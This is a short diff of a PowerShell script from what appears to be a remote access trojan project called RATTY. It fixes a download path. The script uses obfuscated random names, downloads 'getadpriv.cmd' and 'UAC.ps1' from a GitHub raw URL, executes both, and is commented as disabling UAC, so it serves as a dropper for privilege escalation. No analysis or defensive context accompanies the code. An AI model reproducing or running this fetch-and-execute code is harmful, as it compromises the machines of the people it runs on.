@@ -5,7 +5,7 @@
 $uXqvmLVgcR = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 [System.Net.ServicePointManager]::SecurityProtocol = $uXqvmLVgcR
 Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resources/getadpriv.cmd" -OutFile "bGnQSfviwu.cmd"
-Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/resources/UAC.ps1" -OutFile "fyvQVwBMgE.ps1"
+Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resources/UAC.ps1" -OutFile "fyvQVwBMgE.ps1"
 powershell .\fyvQVwBMgE.ps1
 "bGnQSfviwu.cmd"|cmd
 # disable UACMOM
